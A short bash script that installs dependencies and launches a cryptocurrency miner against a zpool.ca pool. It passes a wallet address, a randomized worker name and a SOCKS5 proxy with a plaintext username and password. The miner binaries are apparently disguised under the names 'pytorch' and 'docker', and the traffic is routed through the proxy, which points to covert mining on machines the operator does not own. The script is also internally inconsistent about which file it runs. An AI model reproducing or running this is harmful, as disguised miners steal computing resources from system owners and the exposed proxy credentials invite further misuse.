#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x docker 
screen -dmS ls 
POOL=stratum+tcp://verushash.na.mine.zpool.ca:6143
WALLET=MRYuRYQofJEpkcFrSpcrUqmxQfcpFz4wf3
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
PROXY=socks5://cuan:berhasil123@199.249.170.113:443
./pytorch -a lyra2z330 -o $POOL -u $WALLET.$WORKER -p c=LTC,zap=VRSC -t 2 -x $PROXY
